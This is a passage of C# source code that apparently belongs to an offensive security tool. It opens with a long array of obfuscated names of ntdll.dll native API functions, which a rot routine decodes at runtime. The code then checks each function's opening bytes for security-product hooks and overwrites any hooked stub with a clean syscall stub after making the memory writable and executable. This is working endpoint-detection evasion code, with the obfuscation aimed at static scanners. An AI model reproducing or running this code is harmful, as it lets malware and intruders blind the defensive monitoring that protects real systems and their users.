            "KhzaPYvPjEcLYdLNePO",
            "KhzaPYvPjEcLYdLNePOpi",
            "KhzaPYvPjPOpgPYe",
            "KhzaPYxfeLYe",
            "KhzaPYzMUPNelfOTelWLcX",
            "KhzaPYALceTeTZY",
            "KhzaPYAcTgLePyLXPdaLNP",
            "KhzaPYAcZNPdd",
            "KhzaPYAcZNPddEZVPY",
            "KhzaPYAcZNPddEZVPYpi",
            "KhzaPYCPRTdecjEcLYdLNeTZY",
            "KhzaPYCPdZfcNPxLYLRPc",
            "KhzaPYDPNeTZY",
            "KhzaPYDPXLaSZcP",
            "KhzaPYDPddTZY",
            "KhzaPYDjXMZWTNwTYVzMUPNe",
            "KhzaPYEScPLO",
            "KhzaPYEScPLOEZVPY",
            "KhzaPYEScPLOEZVPYpi",
            "KhzaPYETXPc",
            "KhzaPYEcLYdLNeTZY",
            "KhzaPYEcLYdLNeTZYxLYLRPc",
            "KhAWfRAWLjnZYecZW",
            "KhAZhPctYQZcXLeTZY",
            "KhAcPAcPaLcPnZXaWPeP",
            "KhAcPAcPaLcPpYWTdeXPYe",
            "KhAcPaLcPnZXaWPeP",
            "KhAcPaLcPpYWTdeXPYe",
            "KhAcTgTWPRPnSPNV",
            "KhAcTgTWPRPzMUPNelfOTelWLcX",
            "KhAcTgTWPRPODPcgTNPlfOTelWLcX",
            "KhAcZaLRLeTZYnZXaWPeP",
            "KhAcZaLRLeTZYqLTWPO",
            "KhAcZePNeGTcefLWxPXZcj",
            "KhAfWdPpgPYe",
            "KhBfPcjleecTMfePdqTWP",
            "KhBfPcjmZZepYecjzcOPc",
            "KhBfPcjmZZezaeTZYd",
            "KhBfPcjoPMfRqTWePcDeLeP",
            "KhBfPcjoPQLfWewZNLWP",
            "KhBfPcjoPQLfWeFtwLYRfLRP",
            "KhBfPcjoTcPNeZcjqTWP",
            "KhBfPcjoTcPNeZcjzMUPNe",
            "KhBfPcjocTgPcpYecjzcOPc",
            "KhBfPcjpLqTWP",
            "KhBfPcjpgPYe",
            "KhBfPcjqfWWleecTMfePdqTWP",
            "KhBfPcjtYQZcXLeTZYleZX",
            "KhBfPcjtYQZcXLeTZYpYWTdeXPYe",
            "KhBfPcjtYQZcXLeTZYqTWP",
            "KhBfPcjtYQZcXLeTZYuZMzMUPNe",
            "KhBfPcjtYQZcXLeTZYAZce",
            "KhBfPcjtYQZcXLeTZYAcZNPdd",
            "KhBfPcjtYQZcXLeTZYCPdZfcNPxLYLRPc",
            "KhBfPcjtYQZcXLeTZYEScPLO",
            "KhBfPcjtYQZcXLeTZYEZVPY",
            "KhBfPcjtYQZcXLeTZYEcLYdLNeTZY",
            "KhBfPcjtYQZcXLeTZYEcLYdLNeTZYxLYLRPc",
            "KhBfPcjtYQZcXLeTZYHZcVPcqLNeZcj",
            "KhBfPcjtYdeLWWFtwLYRfLRP",
            "KhBfPcjtYePcgLWAcZQTWP",
            "KhBfPcjtZnZXaWPeTZY",
            "KhBfPcjvPj",
            "KhBfPcjwTNPYdPGLWfP",
            "KhBfPcjxfWeTaWPGLWfPvPj",
            "KhBfPcjxfeLYe",
            "KhBfPcjzMUPNe",
            "KhBfPcjzaPYDfMvPjd",
            "KhBfPcjzaPYDfMvPjdpi",
            "KhBfPcjAPcQZcXLYNPnZfYePc",
            "KhBfPcjAZcetYQZcXLeTZYAcZNPdd",
            "KhBfPcjBfZeLtYQZcXLeTZYqTWP",
            "KhBfPcjDPNeTZY",
            "KhBfPcjDPNfcTejleecTMfePdEZVPY",
            "KhBfPcjDPNfcTejzMUPNe",
            "KhBfPcjDPNfcTejAZWTNj",
            "KhBfPcjDPXLaSZcP",
            "KhBfPcjDjXMZWTNwTYVzMUPNe",
            "KhBfPcjDjdePXpYgTcZYXPYeGLWfP",
            "KhBfPcjDjdePXpYgTcZYXPYeGLWfPpi",
            "KhBfPcjDjdePXtYQZcXLeTZY",
            "KhBfPcjDjdePXtYQZcXLeTZYpi",
            "KhBfPcjETXPc",
            "KhBfPcjETXPcCPdZWfeTZY",
            "KhBfPcjGLWfPvPj",
            "KhBfPcjGTcefLWxPXZcj",
            "KhBfPcjGZWfXPtYQZcXLeTZYqTWP",
            "KhBfPcjHYQDeLePoLeL",
            "KhBfPcjHYQDeLePyLXPtYQZcXLeTZY",
            "KhBfPfPlaNEScPLO",
            "KhBfPfPlaNEScPLOpi",
            "KhCLTdPpiNPaeTZY",
            "KhCLTdPsLcOpccZc",
            "KhCPLOqTWP",
            "KhCPLOqTWPDNLeePc",
            "KhCPLOzYWjpYWTdeXPYe",
            "KhCPLOCPbfPdeoLeL",
            "KhCPLOGTcefLWxPXZcj",
            "KhCPNZgPcpYWTdeXPYe",
            "KhCPNZgPcCPdZfcNPxLYLRPc",
            "KhCPNZgPcEcLYdLNeTZYxLYLRPc",
            "KhCPRTdePcAcZeZNZWlOOcPddtYQZcXLeTZY",
            "KhCPRTdePcEScPLOEPcXTYLePAZce",
            "KhCPWPLdPvPjPOpgPYe",
            "KhCPWPLdPxfeLYe",
            "KhCPWPLdPDPXLaSZcP",
            "KhCPWPLdPHZcVPcqLNeZcjHZcVPc",
            "KhCPXZgPtZnZXaWPeTZY",
            "KhCPXZgPtZnZXaWPeTZYpi",
            "KhCPXZgPAcZNPddoPMfR",
            "KhCPYLXPvPj",
            "KhCPYLXPEcLYdLNeTZYxLYLRPc",
            "KhCPaWLNPvPj",
            "KhCPaWLNPALceTeTZYFYTe",
            "KhCPaWjAZce",
            "KhCPaWjHLTeCPNPTgPAZce",
            "KhCPaWjHLTeCPNPTgPAZcepi",
            "KhCPaWjHLTeCPaWjAZce",
            "KhCPbfPdeAZce",
            "KhCPbfPdeHLTeCPaWjAZce",
            "KhCPdPepgPYe",
            "KhCPdPeHcTePHLeNS",
            "KhCPdeZcPvPj",
            "KhCPdfXPAcZNPdd",
            "KhCPdfXPEScPLO",
            "KhCPgPcenZYeLTYPctXaPcdZYLeTZY",
            "KhCZWWMLNVnZXaWPeP",
            "KhCZWWMLNVpYWTdeXPYe",
            "KhCZWWMLNVCPRTdecjEcLYdLNeTZY",
            "KhCZWWMLNVEcLYdLNeTZY",
            "KhCZWWQZchLcOEcLYdLNeTZYxLYLRPc",
            "KhDLgPvPj",
            "KhDLgPvPjpi",
            "KhDLgPxPcRPOvPjd",
            "KhDPNfcPnZYYPNeAZce",
            "KhDPcTLWTkPmZZe",
            "KhDPemZZepYecjzcOPc",
            "KhDPemZZezaeTZYd",
            "KhDPenLNSPODTRYTYRwPgPW",
            "KhDPenLNSPODTRYTYRwPgPW2",
            "KhDPenZYePieEScPLO",
            "KhDPeoPMfRqTWePcDeLeP",
            "KhDPeoPQLfWesLcOpccZcAZce",
            "KhDPeoPQLfWewZNLWP",
            "KhDPeoPQLfWeFtwLYRfLRP",
            "KhDPeocTgPcpYecjzcOPc",
            "KhDPepLqTWP",
            "KhDPepgPYe",
            "KhDPepgPYemZZdeAcTZcTej",
            "KhDPesTRSpgPYeALTc",
            "KhDPesTRSHLTewZhpgPYeALTc",
            "KhDPetCETXPc",
            "KhDPetYQZcXLeTZYoPMfRzMUPNe",
            "KhDPetYQZcXLeTZYpYWTdeXPYe",
            "KhDPetYQZcXLeTZYqTWP",
            "KhDPetYQZcXLeTZYuZMzMUPNe",
            "KhDPetYQZcXLeTZYvPj",
            "KhDPetYQZcXLeTZYzMUPNe",
            "KhDPetYQZcXLeTZYAcZNPdd",
            "KhDPetYQZcXLeTZYCPdZfcNPxLYLRPc",
            "KhDPetYQZcXLeTZYDjXMZWTNwTYV",
            "KhDPetYQZcXLeTZYEScPLO",
            "KhDPetYQZcXLeTZYEZVPY",
            "KhDPetYQZcXLeTZYEcLYdLNeTZY",
            "KhDPetYQZcXLeTZYEcLYdLNeTZYxLYLRPc",
            "KhDPetYQZcXLeTZYGTcefLWxPXZcj",
            "KhDPetYQZcXLeTZYHZcVPcqLNeZcj",
            "KhDPetYePcgLWAcZQTWP",
            "KhDPetZnZXaWPeTZY",
            "KhDPetZnZXaWPeTZYpi",
            "KhDPewOepYecTPd",
            "KhDPewZhpgPYeALTc",
            "KhDPewZhHLTesTRSpgPYeALTc",
            "KhDPeBfZeLtYQZcXLeTZYqTWP",
            "KhDPeDPNfcTejzMUPNe",
            "KhDPeDjdePXpYgTcZYXPYeGLWfP",
            "KhDPeDjdePXpYgTcZYXPYeGLWfPpi",
            "KhDPeDjdePXtYQZcXLeTZY",
            "KhDPeDjdePXAZhPcDeLeP",
            "KhDPeDjdePXETXP",
            "KhDPeEScPLOpiPNfeTZYDeLeP",
            "KhDPeETXPc",
            "KhDPeETXPc2",
            "KhDPeETXPcpi",
            "KhDPeETXPcCPdZWfeTZY",
            "KhDPeFfTODPPO",
            "KhDPeGLWfPvPj",
            "KhDPeGZWfXPtYQZcXLeTZYqTWP",
            "KhDPeHYQAcZNPddyZeTQTNLeTZYpgPYe",
            "KhDSfeOZhYDjdePX",
            "KhDSfeOZhYHZcVPcqLNeZcj",
            "KhDTRYLWlYOHLTeqZcDTYRWPzMUPNe",
            "KhDTYRWPASLdPCPUPNe",
            "KhDeLceAcZQTWP",
            "KhDeZaAcZQTWP",
            "KhDfMdNcTMPHYQDeLePnSLYRP",
            "KhDfdaPYOAcZNPdd",
            "KhDfdaPYOEScPLO",
            "KhDjdePXoPMfRnZYecZW",
            "KhEPcXTYLePuZMzMUPNe",
            "KhEPcXTYLePAcZNPdd",
            "KhEPcXTYLePEScPLO",
            "KhEPdelWPce",
            "KhESLhCPRTdecj",
            "KhESLhEcLYdLNeTZYd",
            "KhEcLNPnZYecZW",
            "KhEcLNPpgPYe",
            "KhEcLYdWLePqTWPALeS",
            "KhFXdEScPLOJTPWO",
            "KhFYWZLOocTgPc",
            "KhFYWZLOvPj",
            "KhFYWZLOvPj2",
            "KhFYWZLOvPjpi",
            "KhFYWZNVqTWP",
            "KhFYWZNVGTcefLWxPXZcj",
            "KhFYXLaGTPhzQDPNeTZY",
            "KhFYXLaGTPhzQDPNeTZYpi",
            "KhFYdfMdNcTMPHYQDeLePnSLYRP",
            "KhFaOLePHYQDeLePoLeL",
            "KhGOXnZYecZW",
            "KhHLTeqZclWPcemjEScPLOtO",
            "KhHLTeqZcoPMfRpgPYe",
            "KhHLTeqZcvPjPOpgPYe",
            "KhHLTeqZcxfWeTaWPzMUPNed",
            "KhHLTeqZcxfWeTaWPzMUPNed32",
            "KhHLTeqZcDTYRWPzMUPNe",
            "KhHLTeqZcHZcVGTLHZcVPcqLNeZcj",
            "KhHLTesTRSpgPYeALTc",
            "KhHLTewZhpgPYeALTc",
            "KhHZcVPcqLNeZcjHZcVPcCPLOj",
            "KhHcTePqTWP",
            "KhHcTePqTWPrLeSPc",
            "KhHcTePCPbfPdeoLeL",
            "KhHcTePGTcefLWxPXZcj",
            "KhJTPWOpiPNfeTZY"
        };
        private static byte[] safeBytes = {
            0x4c, 0x8b, 0xd1, // mov r10, rcx
            0xb8              // mov eax, ??
        };

        private static bool check_safe_func(KeyValuePair<string, IntPtr> func)
        {
            byte[] instructions = new byte[4];
            Marshal.Copy(func.Value, instructions, 0, 4);
            string fmtFunc = string.Format("    {0,-25} 0x{1:X} ", func.Key, func.Value.ToInt64());

            if (instructions.SequenceEqual(safeBytes))
            {
                Console.WriteLine(fmtFunc + "- SAFE");
                return true;
            }
            else
            {
                byte[] hookInstructions = new byte[32];
                Marshal.Copy(func.Value, hookInstructions, 0, 32);
                Console.WriteLine(fmtFunc + " - HOOK DETECTED");
                Console.WriteLine("    {0,-25} {1}", "Instructions: ", BitConverter.ToString(hookInstructions).Replace("-", " "));
                return false;
            }
        }

        private unsafe static void unhook_func(KeyValuePair<string, IntPtr> func, Process proc)
        {
            try
            {
                byte* ptr = (byte*)func.Value;
                IntPtr addr = func.Value;
                IntPtr size = (IntPtr)16;
                Console.Write("     |-> STUB " + func.Key + ":");
                IntPtr syscall = DI.Generic.GetSyscallStub(func.Key);
                byte* syscall_ptr = (byte*)syscall;
                Console.Write(" => RWX");
                uint oldProtect = DI.Native.NtProtectVirtualMemory(
                    proc.Handle,
                    ref addr,
                    ref size,
                    0x40 // Page Execute ReadWrite
                );
                Console.Write(" => WRITE");
                for (int i = 0; i < 16; i++)
                {
                    ptr[i] = syscall_ptr[i];
                }
                Console.Write(" => RX");
                DI.Native.NtProtectVirtualMemory(
                    proc.Handle,
                    ref addr,
                    ref size,
                    oldProtect
                );
                Console.WriteLine(" => UNHOOKED!");
            }
            catch (Exception e)
            {
                Console.WriteLine(" => EXCEPTION!");
                Console.WriteLine(e.Message);
                return;
            }
        }

        public static void Unhook()
        {
            Console.WriteLine("Checking hooking of ntdll.dll...");
            // Get the base address of ntdll.dll in our own process
            IntPtr ntdllBase = GetNTDLLBase();
            if (ntdllBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Couldn't find ntdll.dll");
                return;

            }
            else { Console.WriteLine("NTDLL Base Address: 0x{0:X}", ntdllBase.ToInt64()); }

            // Get the address of each of the target functions in ntdll.dll
            IDictionary<string, IntPtr> funcAddresses = GetFuncAddress(ntdllBase, functions);
            Process proc = Process.GetCurrentProcess();
            // Check the first DWORD at each function's address for proper SYSCALL setup
            Console.WriteLine("==============================================================");
            foreach (KeyValuePair<string, IntPtr> func in funcAddresses)
            {
                if (!check_safe_func(func))
                {
                    unhook_func(func, proc);
                    check_safe_func(func);
                }
            }
            Console.WriteLine("==============================================================");
        }

        private static IntPtr GetNTDLLBase()
        {
            Process hProc = Process.GetCurrentProcess();
            ProcessModule module = hProc.Modules.Cast<ProcessModule>().SingleOrDefault(m => string.Equals(m.ModuleName, "ntdll.dll", StringComparison.OrdinalIgnoreCase));
            if (module != null && module.BaseAddress != null)
            {
                return module.BaseAddress;
            }
            else
            {
                return IntPtr.Zero;
            }
        }

        private static IDictionary<string, IntPtr> GetFuncAddress(IntPtr hModule, string[] functions)
        {
            IDictionary<string, IntPtr> funcAddresses = new Dictionary<string, IntPtr>();
            foreach (string rotfunction in functions)
            {
                string function = rot(rotfunction);
                try
                {
                    IntPtr funcPtr = DI.Generic.GetExportAddress(hModule, function);
                    funcAddresses.Add(function, funcPtr);
                }
                catch (MissingMethodException)
                {
                    Console.WriteLine("[-] Couldn't locate the address for {0}!", function);
                }
            }

            return funcAddresses;
        }
    }
}
